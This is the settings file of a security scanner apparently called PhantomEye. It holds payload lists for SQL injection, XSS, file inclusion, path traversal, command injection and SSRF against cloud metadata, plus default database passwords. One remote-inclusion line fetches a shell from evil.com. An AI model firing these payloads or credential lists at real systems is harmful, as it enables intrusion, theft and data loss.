import os

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


class Settings:
    TOOL_NAME   = "PhantomEye"
    PREFIX      = "pe"
    VERSION     = "2.0.0"
    AUTHOR      = "S1r1us"

    DEFAULT_TIMEOUT  = 5
    CONNECT_TIMEOUT  = 3
    READ_TIMEOUT     = 10
    MAX_THREADS      = 100
    DEFAULT_RATE     = 150

    TOP_PORTS = [
        21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445,
        465, 587, 993, 995, 1080, 1194, 1433, 1521, 1723, 3000, 3306,
        3389, 4444, 5432, 5900, 5984, 6379, 8000, 8080, 8443, 8888,
        9090, 9200, 11211, 27017, 50000,
    ]

    DB_PORTS = {
        "mysql":         3306,
        "postgresql":    5432,
        "mssql":         1433,
        "oracle":        1521,
        "mongodb":       27017,
        "redis":         6379,
        "memcached":     11211,
        "elasticsearch": 9200,
        "cassandra":     9042,
        "couchdb":       5984,
        "neo4j":         7474,
        "influxdb":      8086,
    }

    WEB_PORTS    = [80, 443, 8080, 8443, 8000, 8888, 9090, 3000, 4000, 5000, 7000, 7443]
    CLOUD_PORTS  = [2375, 2376, 4243, 5000, 6443, 8001, 10250, 10255]
    ICS_PORTS    = [102, 502, 503, 4840, 20000, 44818, 47808, 1962, 2222, 34980]

    SSL_WEAK_PROTOCOLS = ["SSLv2", "SSLv3", "TLSv1", "TLSv1.1"]
    SSL_WEAK_CIPHERS   = ["RC4", "DES", "3DES", "NULL", "EXPORT", "anon", "MD5"]

    SECURITY_HEADERS = [
        "Strict-Transport-Security",
        "Content-Security-Policy",
        "X-Frame-Options",
        "X-Content-Type-Options",
        "X-XSS-Protection",
        "Referrer-Policy",
        "Permissions-Policy",
        "Cache-Control",
    ]

    CVE_SIGNATURES = {
        "Apache/2.4.49":  "CVE-2021-41773 — Path Traversal & RCE",
        "Apache/2.4.50":  "CVE-2021-42013 — Path Traversal & RCE",
        "nginx/1.16":     "CVE-2019-9511 — HTTP/2 DoS",
        "OpenSSL/1.0.1":  "CVE-2014-0160 — Heartbleed",
        "OpenSSL/1.0.2":  "CVE-2016-0800 — DROWN Attack",
        "PHP/5.":         "EOL PHP — multiple CVEs",
        "PHP/7.0":        "EOL PHP — CVE-2019-11043 and others",
        "PHP/7.1":        "EOL PHP — multiple CVEs",
        "IIS/6.0":        "CVE-2017-7269 — Buffer Overflow RCE",
        "Tomcat/7.":      "CVE-2017-12617 — JSP Upload Bypass RCE",
        "struts2":        "CVE-2017-5638 — Apache Struts RCE",
        "Jenkins":        "CVE-2019-1003000 — Groovy Sandbox Bypass",
        "Drupal/7":       "CVE-2018-7600 — Drupalgeddon2 RCE",
        "jboss":          "CVE-2017-12149 — JBoss Deserialization RCE",
        "WebLogic":       "CVE-2019-2725 — WebLogic RCE",
        "Exchange":       "CVE-2021-26855 — ProxyLogon SSRF",
        "Log4j":          "CVE-2021-44228 — Log4Shell RCE",
        "Spring/5.3":     "CVE-2022-22965 — Spring4Shell RCE",
    }

    DEFAULT_DB_CREDS = {
        "mysql":      [("root",""), ("root","root"), ("root","toor"), ("admin","admin")],
        "postgresql": [("postgres","postgres"), ("postgres",""), ("admin","admin")],
        "mssql":      [("sa",""), ("sa","sa"), ("admin","admin"), ("sa","Password1")],
        "mongodb":    [("",""), ("admin","admin"), ("root","root")],
        "redis":      [("",""), ("admin","")],
        "oracle":     [("system","manager"), ("sys","change_on_install"), ("scott","tiger")],
    }

    SQLI_PAYLOADS = [
        "'", "\"", "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1",
        "' UNION SELECT NULL--", "'; DROP TABLE users--",
        "1' AND SLEEP(5)--", "1 AND 1=2 UNION SELECT 1,2,3--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
        "') OR ('1'='1", "1; WAITFOR DELAY '0:0:5'--",
    ]

    XSS_PAYLOADS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "'\"><script>alert(1)</script>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "<details open ontoggle=alert(1)>",
        "<iframe src=javascript:alert(1)>",
    ]

    LFI_PAYLOADS = [
        "../../../etc/passwd",
        "../../../../etc/shadow",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "/etc/passwd%00",
        "....//....//....//etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "/proc/self/environ",
        "/var/log/apache2/access.log",
    ]

    RFI_PAYLOADS = [
        "http://evil.com/shell.txt",
        "https://evil.com/shell.php?",
        "//evil.com/shell.txt",
    ]

    SSRF_TARGETS = [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    ]

    CMD_PAYLOADS = [
        ";id", "&&id", "||id", "`id`", "$(id)",
        ";cat /etc/passwd", "|whoami",
        ";sleep 5", "&&sleep 5",
    ]

    PATH_TRAVERSAL = [
        "/../../../etc/passwd",
        "/..%2F..%2F..%2Fetc%2Fpasswd",
        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/%252e%252e/%252e%252e/etc/passwd",
        "/....//....//....//etc/passwd",
        "\\..\\..\\windows\\win.ini",
    ]

    FALLBACK_DIRS = [
        "admin", "login", "wp-admin", "phpmyadmin", "dashboard", "api",
        "backup", "config", "test", "dev", "uploads", "static", "assets",
        "js", "css", "img", "images", "includes", "src", "tmp", "log", "logs",
        ".git", ".env", "robots.txt", "sitemap.xml", "readme.txt", "info.php",
        "phpinfo.php", "server-status", "actuator", "swagger-ui.html",
        "graphql", "v1", "v2", ".htaccess", "web.config", "crossdomain.xml",
        ".DS_Store", "composer.json", "package.json", ".gitignore",
        "Dockerfile", "docker-compose.yml", "wp-config.php", "wp-login.php",
        "xmlrpc.php", "readme.html", "license.txt",
    ]

    DANGEROUS_FILES = [
        ".env", ".env.local", ".env.production", ".env.backup",
        "config.php", "config.yml", "config.json", "database.yml",
        "wp-config.php", "settings.py", "application.properties",
        "id_rsa", "id_rsa.pub", ".bash_history",
        "backup.sql", "dump.sql", "db.sql",
        "error.log", "access.log", "debug.log",
    ]

    CGI_PATHS = [
        "/cgi-bin/test.cgi", "/cgi-bin/printenv.pl",
        "/cgi-bin/test-cgi", "/cgi-bin/php",
        "/cgi-bin/bash", "/cgi-bin/status",
    ]

    SNMP_COMMUNITIES = [
        "public", "private", "manager", "community",
        "admin", "default", "cisco", "snmp",
    ]

    USER_AGENTS = [
        "Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        "pe/2.0 (PhantomEye Security Scanner; S1r1us)",
    ]

    REPORT_DIR = os.path.join(BASE_DIR, "reports", "output")
    LOG_DIR    = os.path.join(BASE_DIR, "logs")

    PCI_DSS_REQUIREMENTS = {
        "1": "Install and maintain network security controls",
        "2": "Apply secure configurations to all system components",
        "3": "Protect stored account data",
        "4": "Protect cardholder data with strong cryptography during transmission",
        "5": "Protect all systems against malware",
        "6": "Develop and maintain secure systems and software",
        "7": "Restrict access to system components by business need to know",
        "8": "Identify users and authenticate access to system components",
        "10": "Log and monitor all access to system components and cardholder data",
        "11": "Test security of systems and networks regularly",
    }

    OWASP_TOP10 = {
        "A01": "Broken Access Control",
        "A02": "Cryptographic Failures",
        "A03": "Injection",
        "A04": "Insecure Design",
        "A05": "Security Misconfiguration",
        "A06": "Vulnerable and Outdated Components",
        "A07": "Identification and Authentication Failures",
        "A08": "Software and Data Integrity Failures",
        "A09": "Security Logging and Monitoring Failures",
        "A10": "Server-Side Request Forgery",
    }
